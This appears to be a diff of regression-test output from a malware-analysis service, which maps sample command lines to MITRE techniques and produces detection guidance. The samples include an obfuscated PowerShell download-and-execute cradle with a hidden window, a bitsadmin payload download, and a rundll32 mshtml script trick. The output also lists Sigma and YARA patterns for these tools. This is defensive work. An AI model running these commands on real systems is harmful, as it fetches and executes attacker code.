+                  "value": "http://223.\u3031\u2e00\u3100\u3200\u2f00\u6900\u6e00\u6700\u2700\u2900"
+                }
+              ],
               "iocs_summary": {},
               "language": "powershell",
               "lolbins": [
@@ -6308,17 +6483,29 @@
                   "evidence": "-WindowStyle Hidden.",
                   "id": "T1564.003",
                   "name": "Hide Artifacts: Hidden Window"
+                },
+                {
+                  "evidence": "Download cradle (WebClient / iwr / curl).",
+                  "id": "T1105",
+                  "name": "Ingress Tool Transfer",
+                  "source": "recursive_decode"
+                },
+                {
+                  "evidence": "Recursive base64 decode surfaced 2 additional evidence element(s) across nested layer(s).",
+                  "id": "T1140",
+                  "name": "Deobfuscate/Decode Files or Information",
+                  "source": "recursive_decode"
                 }
               ]
             }
           },
-          "elapsed_ms": 104.8,
+          "elapsed_ms": 109.6,
           "status": 200
         },
         "narrate": {
           "body": {
             "narrative": {
-              "analyst_summary": "During **Execution** the analyst observed `T1059.001` (PowerShell). During **Defense Evasion** the analyst observed `T1027` (Obfuscated Files or Information), `T1564.003` (Hide Artifacts: Hidden Window).",
+              "analyst_summary": "During **Execution** the analyst observed `T1059.001` (PowerShell). During **Defense Evasion** the analyst observed `T1027` (Obfuscated Files or Information), `T1564.003` (Hide Artifacts: Hidden Window), `T1140` (Deobfuscate/Decode Files or Information). During **Command And Control** the analyst observed `T1105` (Ingress Tool Transfer).",
               "attack_progression": [
                 {
                   "evidence": [
@@ -6339,45 +6526,56 @@
                   "phase": "Execution"
                 },
                 {
-                  "activity": "2 technique(s) observed (T1027, T1564.003). Attacker objective: Evade EDR / AV detection.",
+                  "activity": "3 technique(s) observed (T1027, T1564.003, T1140). Attacker objective: Evade EDR / AV detection.",
                   "kill_chain": "Defense Evasion",
                   "phase": "Defense Evasion"
+                },
+                {
+                  "activity": "1 technique(s) observed (T1105). Attacker objective: Maintain a channel to attacker infrastructure.",
+                  "kill_chain": "Command And Control",
+                  "phase": "Command And Control"
                 }
               ],
-              "executive_summary": "Investigation surface exposes 3 MITRE ATT&CK technique(s) mapped across 2 tactic(s): **Execution** (1 tech.), **Defense Evasion** (2 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
+              "executive_summary": "Investigation surface exposes 5 MITRE ATT&CK technique(s) mapped across 3 tactic(s): **Execution** (1 tech.), **Defense Evasion** (3 tech.), **Command And Control** (1 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
               "kill_chain_coverage": [],
               "likely_objective": [
                 "Execute attacker code on the endpoint",
-                "Evade EDR / AV detection"
+                "Evade EDR / AV detection",
+                "Maintain a channel to attacker infrastructure"
               ],
               "mitre_matrix": [],
               "overall_assessment": {
-                "attack_progress_pct": 36,
-                "confidence": "Medium",
+                "attack_progress_pct": 45,
+                "confidence": "High",
                 "primary_objective": "Evade EDR / AV detection",
                 "risk": "High"
               },
               "recommended_actions": [
                 "[Execution] Enable AMSI on all endpoints; enforce Constrained Language Mode for non-admin PowerShell; disable Office macros from the internet zone.",
                 "[Defense Evasion] Alert on any tampering with Defender, Sysmon, or EDR services; deploy tamper-protection where available.",
+                "[Command And Control] Block observed C2 IOCs at the proxy / firewall / DNS; hunt for other hosts beaconing to the same infrastructure.",
                 "[T1059.001] Enable PowerShell Script Block Logging (EventID 4104) and Module Logging on all workstations; forward to SIEM and hunt for `IEX`, `Invoke-Expression`, `FromBase64String`, and `DownloadString` invocations.",
                 "[T1027] Alert on high-entropy PowerShell script blocks (>4.5 bits/char) and Base64 strings longer than 1 KB inside `-EncodedCommand` payloads.",
-                "[T1564.003] Detect PowerShell / cmd invocations with `-WindowStyle Hidden`, `-w hidden`, or `/min` \u2014 these are strong indicators of interactive malware execution."
+                "[T1564.003] Detect PowerShell / cmd invocations with `-WindowStyle Hidden`, `-w hidden`, or `/min` \u2014 these are strong indicators of interactive malware execution.",
+                "[T1105] Block untrusted domains at proxy/DNS; hunt for `certutil -urlcache`, `bitsadmin /transfer`, `curl.exe`, `Invoke-WebRequest`, and `wget.exe` invocations from user workstations.",
+                "[IOC] Block or sink-hole the 1 observed URL indicator(s) at proxy/DNS."
               ],
               "sigma_hunts": [
                 "Sigma: EventID 4104 script_block_text contains any of (`IEX`, `Invoke-Expression`, `DownloadString`, `FromBase64String`, `[Convert]::FromBase64String`)",
                 "Sigma: process powershell.exe command_line contains `-enc` OR `-encodedcommand` with base64 length > 1000",
-                "Sigma: process powershell.exe command_line contains any_of (`-w hidden`, `-windowstyle hidden`, `-noni -w hidden`)"
+                "Sigma: process powershell.exe command_line contains any_of (`-w hidden`, `-windowstyle hidden`, `-noni -w hidden`)",
+                "Sigma: process any_of (`certutil.exe -urlcache`, `bitsadmin.exe /transfer`, `curl.exe`, `wget.exe`) OR powershell.exe with `Invoke-WebRequest`/`iwr`/`Net.WebClient`"
               ],
               "threat_actor_context": "",
               "yara_ideas": [
                 "YARA: strings \"IEX\", \"Invoke-Expression\", \"DownloadString\", \"FromBase64String\"",
                 "YARA: regex /-(e|enc|encodedcommand)\\s+[A-Za-z0-9+/]{200,}={0,2}/i",
-                "YARA: strings \"-WindowStyle Hidden\", \"-w hidden\", \"/min\""
+                "YARA: strings \"-WindowStyle Hidden\", \"-w hidden\", \"/min\"",
+                "YARA: strings \"certutil.exe -urlcache\", \"bitsadmin /transfer\", \"Invoke-WebRequest\", \"DownloadFile\""
               ]
             }
           },
-          "elapsed_ms": 145.6,
+          "elapsed_ms": 102.0,
           "status": 200
         },
         "upload": {
@@ -6405,7 +6603,7 @@
             ],
             "text": "powershell -nop -w hidden -c \"$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbCAtRW5jIFNRQkZBRmdBS0FCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFUZ0JsQUhRQUxnQlhBR1VBWWdCREFHd0FhUUJsQUc0QWRBQXBBQzRBUkFCdkFIY0FiZ0JzQUc4QVlRQmtBRk1BZEFCeUFHa0FiZ0JuQUNnQUp3Qm9BSFFBZEFCd0FEb0FMd0F2QURJQU1nQXpBQzRBTVRBQUxnQXhBRElBTHdCcEFHNEFad0FuQUNrQQ=='));iex $s\""
           },
-          "elapsed_ms": 101.5,
+          "elapsed_ms": 152.2,
           "status": 200
         }
       },
@@ -6493,7 +6691,7 @@
               }
             ]
           },
-          "elapsed_ms": 158.3,
+          "elapsed_ms": 150.7,
           "status": 200
         },
         "die": {
@@ -6571,6 +6769,18 @@
                     "evidence": "-WindowStyle Hidden.",
                     "id": "T1564.003",
                     "name": "Hide Artifacts: Hidden Window"
+                  },
+                  {
+                    "evidence": "Download cradle (WebClient / iwr / curl).",
+                    "id": "T1105",
+                    "name": "Ingress Tool Transfer",
+                    "source": "recursive_decode"
+                  },
+                  {
+                    "evidence": "Recursive base64 decode surfaced 2 additional evidence element(s) across nested layer(s).",
+                    "id": "T1140",
+                    "name": "Deobfuscate/Decode Files or Information",
+                    "source": "recursive_decode"
                   }
                 ],
                 "token_count": 6,
@@ -6651,8 +6861,35 @@
                   "verb": null
                 }
               ],
+              "decoded_layers": [
+                {
+                  "b64_sha256": "e1a8e99e2c75ed540fda91dc6718f44e9a9a6bce9348ba886f128bb83a7fbbda",
+                  "decoded_preview": "powershell -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADIAMgAzAC4AMTAALgAxADIALwBpAG4AZwAnACkA",
+                  "decoded_sha256": "b0980a0653eba399bfbf66d5a6fefb912318b79bc7ff9d1fcdb52432c2550ad1",
+                  "depth": 0,
+                  "encoding": "utf-8",
+                  "pattern_index": 1,
+                  "source_offset": 92
+                },
+                {
+                  "b64_sha256": "15424814a68b32a293e32406ae3e37d6c83e94ea23e09d18edd2876754fbc460",
+                  "decoded_preview": "IEX(New-Object Net.WebClient).DownloadString('http://223.\u3031\u2e00\u3100\u3200\u2f00\u6900\u6e00\u6700\u2700\u2900",
+                  "decoded_sha256": "cd486f306ad7407b1b0a33b7113b39ce8bbdf2da854fff484d57c4296e69fc81",
+                  "depth": 1,
+                  "encoding": "utf-16le",
+                  "pattern_index": 0,
+                  "source_offset": 11
+                }
+              ],
               "dkp_matches": [],
-              "iocs": [],
+              "iocs": [
+                {
+                  "confidence": 0.92,
+                  "kind": "url",
+                  "source": "recursive_decode",
+                  "value": "http://223.\u3031\u2e00\u3100\u3200\u2f00\u6900\u6e00\u6700\u2700\u2900"
+                }
+              ],
               "iocs_summary": {},
               "language": "powershell",
               "lolbins": [
@@ -6755,17 +6992,29 @@
                   "evidence": "-WindowStyle Hidden.",
                   "id": "T1564.003",
                   "name": "Hide Artifacts: Hidden Window"
+                },
+                {
+                  "evidence": "Download cradle (WebClient / iwr / curl).",
+                  "id": "T1105",
+                  "name": "Ingress Tool Transfer",
+                  "source": "recursive_decode"
+                },
+                {
+                  "evidence": "Recursive base64 decode surfaced 2 additional evidence element(s) across nested layer(s).",
+                  "id": "T1140",
+                  "name": "Deobfuscate/Decode Files or Information",
+                  "source": "recursive_decode"
                 }
               ]
             }
           },
-          "elapsed_ms": 110.4,
+          "elapsed_ms": 105.7,
           "status": 200
         },
         "narrate": {
           "body": {
             "narrative": {
-              "analyst_summary": "During **Execution** the analyst observed `T1059.001` (PowerShell). During **Defense Evasion** the analyst observed `T1027` (Obfuscated Files or Information), `T1564.003` (Hide Artifacts: Hidden Window).",
+              "analyst_summary": "During **Execution** the analyst observed `T1059.001` (PowerShell). During **Defense Evasion** the analyst observed `T1027` (Obfuscated Files or Information), `T1564.003` (Hide Artifacts: Hidden Window), `T1140` (Deobfuscate/Decode Files or Information). During **Command And Control** the analyst observed `T1105` (Ingress Tool Transfer).",
               "attack_progression": [
                 {
                   "evidence": [
@@ -6786,45 +7035,56 @@
                   "phase": "Execution"
                 },
                 {
-                  "activity": "2 technique(s) observed (T1027, T1564.003). Attacker objective: Evade EDR / AV detection.",
+                  "activity": "3 technique(s) observed (T1027, T1564.003, T1140). Attacker objective: Evade EDR / AV detection.",
                   "kill_chain": "Defense Evasion",
                   "phase": "Defense Evasion"
+                },
+                {
+                  "activity": "1 technique(s) observed (T1105). Attacker objective: Maintain a channel to attacker infrastructure.",
+                  "kill_chain": "Command And Control",
+                  "phase": "Command And Control"
                 }
               ],
-              "executive_summary": "Investigation surface exposes 3 MITRE ATT&CK technique(s) mapped across 2 tactic(s): **Execution** (1 tech.), **Defense Evasion** (2 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
+              "executive_summary": "Investigation surface exposes 5 MITRE ATT&CK technique(s) mapped across 3 tactic(s): **Execution** (1 tech.), **Defense Evasion** (3 tech.), **Command And Control** (1 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
               "kill_chain_coverage": [],
               "likely_objective": [
                 "Execute attacker code on the endpoint",
-                "Evade EDR / AV detection"
+                "Evade EDR / AV detection",
+                "Maintain a channel to attacker infrastructure"
               ],
               "mitre_matrix": [],
               "overall_assessment": {
-                "attack_progress_pct": 36,
-                "confidence": "Medium",
+                "attack_progress_pct": 45,
+                "confidence": "High",
                 "primary_objective": "Evade EDR / AV detection",
                 "risk": "High"
               },
               "recommended_actions": [
                 "[Execution] Enable AMSI on all endpoints; enforce Constrained Language Mode for non-admin PowerShell; disable Office macros from the internet zone.",
                 "[Defense Evasion] Alert on any tampering with Defender, Sysmon, or EDR services; deploy tamper-protection where available.",
+                "[Command And Control] Block observed C2 IOCs at the proxy / firewall / DNS; hunt for other hosts beaconing to the same infrastructure.",
                 "[T1059.001] Enable PowerShell Script Block Logging (EventID 4104) and Module Logging on all workstations; forward to SIEM and hunt for `IEX`, `Invoke-Expression`, `FromBase64String`, and `DownloadString` invocations.",
                 "[T1027] Alert on high-entropy PowerShell script blocks (>4.5 bits/char) and Base64 strings longer than 1 KB inside `-EncodedCommand` payloads.",
-                "[T1564.003] Detect PowerShell / cmd invocations with `-WindowStyle Hidden`, `-w hidden`, or `/min` \u2014 these are strong indicators of interactive malware execution."
+                "[T1564.003] Detect PowerShell / cmd invocations with `-WindowStyle Hidden`, `-w hidden`, or `/min` \u2014 these are strong indicators of interactive malware execution.",
+                "[T1105] Block untrusted domains at proxy/DNS; hunt for `certutil -urlcache`, `bitsadmin /transfer`, `curl.exe`, `Invoke-WebRequest`, and `wget.exe` invocations from user workstations.",
+                "[IOC] Block or sink-hole the 1 observed URL indicator(s) at proxy/DNS."
               ],
               "sigma_hunts": [
                 "Sigma: EventID 4104 script_block_text contains any of (`IEX`, `Invoke-Expression`, `DownloadString`, `FromBase64String`, `[Convert]::FromBase64String`)",
                 "Sigma: process powershell.exe command_line contains `-enc` OR `-encodedcommand` with base64 length > 1000",
-                "Sigma: process powershell.exe command_line contains any_of (`-w hidden`, `-windowstyle hidden`, `-noni -w hidden`)"
+                "Sigma: process powershell.exe command_line contains any_of (`-w hidden`, `-windowstyle hidden`, `-noni -w hidden`)",
+                "Sigma: process any_of (`certutil.exe -urlcache`, `bitsadmin.exe /transfer`, `curl.exe`, `wget.exe`) OR powershell.exe with `Invoke-WebRequest`/`iwr`/`Net.WebClient`"
               ],
               "threat_actor_context": "",
               "yara_ideas": [
                 "YARA: strings \"IEX\", \"Invoke-Expression\", \"DownloadString\", \"FromBase64String\"",
                 "YARA: regex /-(e|enc|encodedcommand)\\s+[A-Za-z0-9+/]{200,}={0,2}/i",
-                "YARA: strings \"-WindowStyle Hidden\", \"-w hidden\", \"/min\""
+                "YARA: strings \"-WindowStyle Hidden\", \"-w hidden\", \"/min\"",
+                "YARA: strings \"certutil.exe -urlcache\", \"bitsadmin /transfer\", \"Invoke-WebRequest\", \"DownloadFile\""
               ]
             }
           },
-          "elapsed_ms": 135.7,
+          "elapsed_ms": 111.8,
           "status": 200
         },
         "upload": {
@@ -6852,7 +7112,7 @@
             ],
             "text": "powershell -nop -w hidden -c \"$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbCAtRW5jIFNRQkZBRmdBS0FCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFUZ0JsQUhRQUxnQlhBR1VBWWdCREFHd0FhUUJsQUc0QWRBQXBBQzRBUkFCdkFIY0FiZ0JzQUc4QVlRQmtBRk1BZEFCeUFHa0FiZ0JuQUNnQUp3Qm9BSFFBZEFCd0FEb0FMd0F2QURJQU1nQXpBQzRBTVRBQUxnQXhBRElBTHdCcEFHNEFad0FuQUNrQQ=='));iex $s\""
           },
-          "elapsed_ms": 192.7,
+          "elapsed_ms": 105.1,
           "status": 200
         }
       }
@@ -6957,7 +7217,7 @@
             "ti_hits": [],
             "yara": []
           },
-          "elapsed_ms": 153.9,
+          "elapsed_ms": 157.0,
           "status": 200
         },
         "die": {
@@ -6974,7 +7234,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 99.0,
+          "elapsed_ms": 103.5,
           "status": 200
         },
         "narrate": {
@@ -6989,7 +7249,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 103.6,
+          "elapsed_ms": 104.6,
           "status": 200
         },
         "upload": {
@@ -7015,7 +7275,7 @@
             "strings": [],
             "text": "dir"
           },
-          "elapsed_ms": 101.7,
+          "elapsed_ms": 113.4,
           "status": 200
         }
       },
@@ -7046,7 +7306,7 @@
             "ti_hits": [],
             "yara": []
           },
-          "elapsed_ms": 151.3,
+          "elapsed_ms": 154.3,
           "status": 200
         },
         "die": {
@@ -7063,7 +7323,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 96.7,
+          "elapsed_ms": 97.1,
           "status": 200
         },
         "narrate": {
@@ -7078,7 +7338,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 95.8,
+          "elapsed_ms": 102.2,
           "status": 200
         },
         "upload": {
@@ -7104,7 +7364,7 @@
             "strings": [],
             "text": "dir"
           },
-          "elapsed_ms": 109.2,
+          "elapsed_ms": 102.4,
           "status": 200
         }
       }
@@ -7183,7 +7443,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 94.1,
+          "elapsed_ms": 98.1,
           "status": 200
         },
         "narrate": {
@@ -7213,7 +7473,7 @@
             "strings": [],
             "text": null
           },
-          "elapsed_ms": 103.8,
+          "elapsed_ms": 99.7,
           "status": 200
         }
       },
@@ -7236,7 +7496,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 95.9,
+          "elapsed_ms": 95.2,
           "status": 200
         },
         "narrate": {
@@ -7266,7 +7526,7 @@
             "strings": [],
             "text": null
           },
-          "elapsed_ms": 140.1,
+          "elapsed_ms": 115.9,
           "status": 200
         }
       }
@@ -7460,7 +7720,7 @@
               }
             ]
           },
-          "elapsed_ms": 1306.4,
+          "elapsed_ms": 1340.1,
           "status": 200
         },
         "die": {
@@ -7678,7 +7938,7 @@
               ]
             }
           },
-          "elapsed_ms": 101.9,
+          "elapsed_ms": 99.1,
           "status": 200
         },
         "narrate": {
@@ -7738,7 +7998,7 @@
               ]
             }
           },
-          "elapsed_ms": 104.1,
+          "elapsed_ms": 95.3,
           "status": 200
         },
         "upload": {
@@ -7766,7 +8026,7 @@
             ],
             "text": "bitsadmin.exe /transfer job1 /priority foreground http://198.51.100.42/m.exe C:\\ProgramData\\m.exe"
           },
-          "elapsed_ms": 118.9,
+          "elapsed_ms": 102.5,
           "status": 200
         }
       },
@@ -7840,7 +8100,7 @@
               }
             ]
           },
-          "elapsed_ms": 2197.9,
+          "elapsed_ms": 6945.3,
           "status": 200
         },
         "die": {
@@ -8058,7 +8318,7 @@
               ]
             }
           },
-          "elapsed_ms": 97.9,
+          "elapsed_ms": 101.3,
           "status": 200
         },
         "narrate": {
@@ -8118,7 +8378,7 @@
               ]
             }
           },
-          "elapsed_ms": 97.8,
+          "elapsed_ms": 102.9,
           "status": 200
         },
         "upload": {
@@ -8146,7 +8406,7 @@
             ],
             "text": "bitsadmin.exe /transfer job1 /priority foreground http://198.51.100.42/m.exe C:\\ProgramData\\m.exe"
           },
-          "elapsed_ms": 120.4,
+          "elapsed_ms": 172.0,
           "status": 200
         }
       }
@@ -8337,7 +8597,7 @@
               }
             ]
           },
-          "elapsed_ms": 152.6,
+          "elapsed_ms": 154.7,
           "status": 200
         },
         "die": {
@@ -8772,7 +9032,7 @@
               ]
             }
           },
-          "elapsed_ms": 95.2,
+          "elapsed_ms": 98.0,
           "status": 200
         },
         "narrate": {
@@ -8830,7 +9090,7 @@
               ]
             }
           },
-          "elapsed_ms": 97.9,
+          "elapsed_ms": 93.6,
           "status": 200
         },
         "upload": {
@@ -8858,7 +9118,7 @@
             ],
             "text": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write(\"\\74script language=jscript>eval(new ActiveXObject(\\\"WScript.Shell\\\").RegRead(\\\"HKCU\\\\\\\\software\\\\\\\\microsoft\\\\\\\\windows\\\\\\\\currentversion\\\\\\\\run\\\\\\\\evil\\\"));\\74/script>\")"
           },
-          "elapsed_ms": 101.2,
+          "elapsed_ms": 126.8,
           "status": 200
         }
       },
@@ -8933,7 +9193,7 @@
               }
             ]
           },
-          "elapsed_ms": 155.2,
+          "elapsed_ms": 155.1,
           "status": 200
         },
         "die": {
@@ -9368,7 +9628,7 @@
               ]
             }
           },
-          "elapsed_ms": 100.3,
+          "elapsed_ms": 104.7,
           "status": 200
         },
         "narrate": {
@@ -9426,7 +9686,7 @@
               ]
             }
           },
-          "elapsed_ms": 103.3,
+          "elapsed_ms": 101.1,
           "status": 200
         },
         "upload": {
@@ -9454,7 +9714,7 @@
             ],
             "text": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write(\"\\74script language=jscript>eval(new ActiveXObject(\\\"WScript.Shell\\\").RegRead(\\\"HKCU\\\\\\\\software\\\\\\\\microsoft\\\\\\\\windows\\\\\\\\currentversion\\\\\\\\run\\\\\\\\evil\\\"));\\74/script>\")"
           },
-          "elapsed_ms": 107.6,
+          "elapsed_ms": 106.8,
           "status": 200
         }
       }
